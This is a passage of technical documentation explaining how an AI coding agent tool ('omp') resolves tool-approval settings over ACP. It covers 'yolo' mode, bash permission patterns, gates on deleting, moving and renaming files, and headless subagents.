Precedence is the normal settings precedence: runtime flags (`--approval-mode`, `--auto-approve`, `--yolo`) override `--config` overlays, which override project config, which overrides global config. ACP does not currently define a `session/new`, `session/load`, or `session/resume` approval-policy field, so ACP clients that need per-session yolo should launch a separate `omp acp` process with one of the flags above or with a session-specific `--config` overlay.

`tools.approvalMode: yolo` fully applies to ACP when explicitly configured or supplied by a runtime flag: it skips ordinary tier-based OMP prompts and the ACP client gate unless the resolved tool or user policy requires a prompt or denies the call. The schema default is also `yolo`, but without an explicit opt-in, unmatched bash commands and destructive file operations still require an ACP client grant.

For `bash`, ACP resolves `bash.patterns`, critical-command overrides, per-tool policies, and the approval mode before requesting permission: `allow` runs without a card, `deny` blocks without a card, and `prompt` uses `session/request_permission`. An “Always allow” choice covers later ordinary `bash` calls in the session; critical commands and explicit prompt patterns still require a card on every call.

For `delete`, `move`, and `edit` patches containing deletion or rename operations, the additional editor-side gate remains operation-category scoped. Ordinary file-content edits do not use that extra gate. Generic approval prompts use form elicitation when the client advertises `elicitation.form`. A rejected, cancelled, or unsupported prompt rejects or cancels the tool call.

## Subagents

Subagents run headless with `tools.approvalMode: yolo` so ordinary tier-based prompts do not stall them. The parent `task` approval is the authorization boundary. Per-tool policies still use the normal resolver: user `deny` remains absolute, and any call that resolves to `prompt` rejects because a headless subagent cannot satisfy it.
